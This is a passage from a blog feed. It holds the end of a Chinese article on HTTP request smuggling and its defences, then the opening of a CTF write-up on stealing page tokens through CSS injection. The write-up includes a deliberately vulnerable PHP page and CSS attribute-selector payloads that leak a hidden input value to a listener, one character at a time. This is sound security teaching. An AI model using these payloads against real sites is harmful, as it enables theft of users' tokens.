src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191129022617.png" alt=""></p><p>当时找到挺开心的，以为一个 CVE 就这么简单的到手了，因为 Netty CVE 给的启示嘛，这也算是一个解析差异。然后当时我跟导师还仔细深入探究了这个产生的原因，跟了一下代码，发现可能是 Go 某个原生库的原因，我本地也单独抽了其中有问题的代码测了一遍，确认就是那个库的原因。</p><p>当时可开心了，赶紧噼里啪啦搜索如何给 Golang 提 issue ，结果后来仔细弄了一会，发现这个问题在 9月27日已经被提到了 <a href="https://github.com/golang/go/issues/34540" target="_blank" rel="noopener">net/http: invalid headers are normalized, allowing request smuggling</a>，Golang 也在 1.13.1 版修复了该问题。//悔不当初应该提早看一看这方面的内容，错过一个 CVE /捂脸</p><p>然后我仔细看了本地 Golang 版本 1.8.x …然后 Caddy 的 issue 邮件回复也到了…不出所料让我升级 Golang 到 1.13.1，<del>看了一眼 dockerhub 上的 caddy 我吐了</del></p><p>但是目前(11/27) dockerhub 上的 caddy 环境仍然还是有这个问题的，使用需谨慎！</p><h2 id="Something-Else"><a href="#Something-Else" class="headerlink" title="Something Else"></a>Something Else</h2><p>hackerone 上已经有相关漏洞的披露了，这里推荐几篇挖洞实战的文章：</p><p><a href="https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d" target="_blank" rel="noopener">Write up of two HTTP Requests Smuggling</a></p><p><a href="https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html" target="_blank" rel="noopener">HTTP Request Smuggling (CL.TE)</a></p><p><a href="https://hackerone.com/reports/694604" target="_blank" rel="noopener">HTTP Request Smuggling on vpn.lob.com</a></p><h1 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h1><blockquote><p>​    从前面的大量案例中，我们已经知道了HTTP请求走私的危害性，那么该如何防御呢？不针对特定的服务器，通用的防御措施大概有三种。</p><ul><li>禁用代理服务器与后端服务器之间的TCP连接重用。</li><li>使用HTTP/2协议。</li><li>前后端使用相同的服务器。</li></ul><p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的TCP连接重用，会增大后端服务器的压力。使用HTTP/2在现在的网络条件下根本无法推广使用，哪怕支持HTTP/2协议的服务器也会兼容HTTP/1.1。从本质上来说，HTTP请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现RFC7230-7235中所规定的的标准，但这也是最难做到的。</p></blockquote><p>然而我参考了比较多的攻击文章，均没有提到为什么 HTTP/2 可以防范 HTTP Smuggling ，原作者也是一句话带过:</p><blockquote><p>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</p></blockquote><p>之后我去查询了一下 HTTP/2 与 HTTP/1.1 的差异，个人认为主要是 HTTP/2 中加入了 Request multiplexing over a single TCP connection ，也就是说使用 HTTP/2 可以使用单个 TCP 连接来进行请求资源，也就减少了 TCP 连接复用的可能性，即使能 Smuggle 也只能打自己；而且对于新的二进制分帧机制引入也对该种攻击做出了限制。</p><p>具体可以参考 <a href="[https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5](https://developers.google.com/web/fundamentals/performance/http2)">HTTP/2 简介</a></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205225455.png" alt=""></p><h1 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h1><p>经过这段时间的学习研究，自己也将一些相关的实验整理成了 docker 环境，方便大家复现学习：<a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab" target="_blank" rel="noopener">HTTP-Smuggling-Lab</a></p><p>现在环境不多，欢迎 star，后面我会继续加入更多的环境方便大家以白盒的形式去理解学习，<del>如果我有时间的话</del></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://tools.ietf.org/html/rfc7230" target="_blank" rel="noopener">RFC7230</a></p><p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">HTTP Desync Attacks: Request Smuggling Reborn</a></p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p><p><a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">regilero’s blog</a></p><p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p><p><a href="https://github.com/netty/netty/issues/9571" target="_blank" rel="noopener">http request smuggling, cause by obfuscating TE header</a></p><p><a href="https://hackerone.com/reports/648434" target="_blank" rel="noopener">Multiple HTTP Smuggling reports</a></p><p><a href="https://medium.com/@factoryhr/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b" target="_blank" rel="noopener">HTTP/2: the difference between HTTP/1.1, benefits and how to use it</a></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;今年的 Defcon 27 与 Black Hat 上都有提到 HTTP DESYNC ATTACKS ，前几个月就想抽时间来研究研究了，奈何一直没什么时间，最近抽时间专门看了一下。&lt;/p&gt;
&lt;blockquote class=&quot;colorquote success&quot;&gt;&lt;p&gt;文章首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/6878&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6878&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="Sec" scheme="https://blog.zeddyu.info/categories/Sec/"/>
    
    
      <category term="Sec" scheme="https://blog.zeddyu.info/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>XCTF Final NOXSS Write Up</title>
    <link href="https://blog.zeddyu.info/2019/11/21/XCTF-Final-noxss/"/>
    <id>https://blog.zeddyu.info/2019/11/21/XCTF-Final-noxss/</id>
    <published>2019-11-21T00:37:14.000Z</published>
    <updated>2021-09-27T17:45:58.720Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来…赛后问了一下，主要还是差了一篇文章 <a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/" target="_blank" rel="noopener">Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację</a>，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也正是之前 noxss 2017 的解法。</p><blockquote class="colorquote success"><p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/6812" target="_blank" rel="noopener">https://xz.aliyun.com/t/6812</a></p></blockquote><a id="more"></a><p>[TOC]</p><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p><strong>所做的实验测试均在 Chrome  78.0.3904.97 版本上</strong>，Firefox 有一些场景未测试成功。</p><p>我们需要的有 fontforge / nodejs / npm|yarn ，安装 <a href="http://designwithfontforge.com/en-US/Installing_Fontforge.html" target="_blank" rel="noopener">fontforge on ubuntu</a>，安装 <a href="https://stackoverflow.com/questions/41195952/updating-nodejs-on-ubuntu-16-04" target="_blank" rel="noopener">nodejs on ubuntu</a></p><h2 id="INTRO"><a href="#INTRO" class="headerlink" title="INTRO"></a>INTRO</h2><p>在我们看题之前，我们先来看看一些简化的情况</p><p>首先创建一个 css.php ，内容如下：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="hljs-string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="hljs-string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="hljs-string">"X-UA-Compatible"</span> content=<span class="hljs-string">"ie=edge"</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$token1 = md5($_SERVER[<span class="hljs-string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">$token2 = md5($token1);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;input type=hidden value=<span class="hljs-meta">&lt;?</span>=$token1 <span class="hljs-meta">?&gt;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">true<span class="hljs-keyword">var</span> TOKEN = <span class="hljs-string">"&lt;?=$token2 ?&gt;"</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">true<span class="hljs-meta">&lt;?</span>=preg_replace(<span class="hljs-string">'#&lt;/style#i'</span>, <span class="hljs-string">'#'</span>, $_GET[<span class="hljs-string">'css'</span>]) <span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>这段代码也比较简单，input 标签与 script 标签内均有一个 token ，我们需要使用传入 css 参数来获取这两个 token</p><h3 id="Token1-Get-From-Input"><a href="#Token1-Get-From-Input" class="headerlink" title="Token1 - Get From Input"></a>Token1 - Get From Input</h3><p>首先我们来尝试去获取第一个 token1 ，也就是在 input 标签内的 value 属性值，我们可控的只有 css 参数，所以我们只能去尝试构造 css 来获取 input 标签内的 value 属性值。</p><p>在 css 当中我们可以使用 css 选择器来选择我们的标签元素，例如</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* 设置 body 标签元素 */</span></span><br><span class="line"><span class="hljs-selector-tag">body</span> { }</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">/* 设置 .test class 的样式 */</span></span><br><span class="line"><span class="hljs-selector-class">.test</span> { }</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">/* 设置 id 为 test2 的样式 */</span></span><br><span class="line"><span class="hljs-selector-id">#test2</span> { }</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">/* 设置 value 为 abc 的 input 标签的样式 */</span></span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value=<span class="hljs-string">"abc"</span>]</span> { }</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment">/* 设置 value 为 a 开头的 input 标签的样式 */</span></span><br><span class="line"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">"a"</span>]</span> { }</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们可以看到在 css 选择器当中，我们可以设置类似<code>value^="a"</code>这样的选择器来获取我们的元素，所以这里我们大概可以有这么一个操作:</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">hidden</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"7b8a45b8297cf82cc3cefc174c3ae5a1"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">"0"</span>]</span> {</span></span><br><span class="line">            background: url(http://127.0.0.1:9999/0);</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[value^=<span class="hljs-string">"7"</span>]</span> {</span></span><br><span class="line">            background: url(http://127.0.0.1:9999/7);</span><br><span class="line">        }</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119004834.png" alt=""></p><p>可以看到我们这里收到了<code>value^="7"</code>选择器发来的请求，所以我们也可以i使用枚举思想来进行爆破获取 token1 </p><h3 id="Token1-Auto-Get-From-Input"><a href="#Token1-Auto-Get-From-Input" class="headerlink" title="Token1 - Auto Get From Input"></a>Token1 - Auto Get From Input</h3><p>剩下的就是要思考我们要如何去构造自动化工具去获取这个 token1 了，这里自动化的难点就在于如何获取爆破的时候是哪个字符正确了而发起了请求，无法拿到这个 callback 我们也就没有依据判断究竟是哪个字符注入正确了而发起了请求。</p><p>原文是采取了使用 cookie 的方式来进行这个 callback 的过程：</p><ul><li>在服务器上放置一个有 iframe 页面 index.html ，src 为要注入的页面 css</li><li>建立一个服务供接受注入字符发来的请求，并且服务通过设置一个 cookie 来响应这个请求</li><li>index.html 根据 cookie 来进行判断注入的字符是否正确，正确的话就使用变量进行存储然后接着下一位的爆破</li></ul><p>我们在服务端就需要提供这么些功能，所以我们可以构造这么个服务，用<code>npm install</code>或者<code>yarn</code>以下面这个 package.json 构建</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="hljs-attr">"name"</span>: <span class="hljs-string">"css-attack-1"</span>,</span><br><span class="line">  <span class="hljs-attr">"version"</span>: <span class="hljs-string">"1.0.0"</span>,</span><br><span class="line">  <span class="hljs-attr">"description"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">  <span class="hljs-attr">"main"</span>: <span class="hljs-string">"index.js"</span>,</span><br><span class="line">  <span class="hljs-attr">"dependencies"</span>: {</span><br><span class="line">    <span class="hljs-attr">"express"</span>: <span class="hljs-string">"^4.15.5"</span>,</span><br><span class="line">    <span class="hljs-attr">"js-cookie"</span>: <span class="hljs-string">"^2.1.4"</span></span><br><span class="line">  },</span><br><span class="line">  <span class="hljs-attr">"devDependencies"</span>: {},</span><br><span class="line">  <span class="hljs-attr">"author"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">  <span class="hljs-attr">"license"</span>: <span class="hljs-string">"ISC"</span></span><br><span 